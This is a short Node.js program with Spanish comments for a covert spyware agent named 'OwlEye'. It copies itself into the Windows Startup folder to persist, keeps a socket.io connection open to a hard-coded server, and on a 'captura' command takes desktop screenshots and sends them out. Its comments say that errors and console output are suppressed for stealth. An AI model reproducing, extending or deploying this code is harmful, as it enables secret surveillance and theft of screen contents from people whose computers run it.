const io = require('socket.io-client');
const screenshot = require('screenshot-desktop');
const fs = require('fs');
const path = require('path');

// Configuración
const SERVER_URL = 'http://192.168.100.24:3000'; // Reemplaza con la IP de tu servidor
const STARTUP_FOLDER = path.join(process.env.APPDATA, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
const EXECUTABLE_NAME = 'OwlEye.exe';

// Verificar ubicación y copiarse a la carpeta de arranque
const currentPath = process.execPath;
const startupPath = path.join(STARTUP_FOLDER, EXECUTABLE_NAME);

if (currentPath !== startupPath) {
    try {
        fs.copyFileSync(currentPath, startupPath);
    } catch (err) {
        // Silenciar errores para ejecución sigilosa
    }
}

// Conectar al servidor
const socket = io(SERVER_URL, { reconnection: true });

// Confirmar conexión
socket.on('connect', () => {
    // No usar console.log para evitar consola visible
});

// Escuchar comandos del servidor
socket.on('command', (cmd) => {
    if (cmd === 'captura') {
        screenshot().then((img) => {
            socket.emit('screenshot', img);
        }).catch((err) => {
            // Silenciar errores
        });
    }
});

// Manejar desconexiones
socket.on('disconnect', () => {
    // Intentará reconectarse automáticamente gracias a reconnection: true
});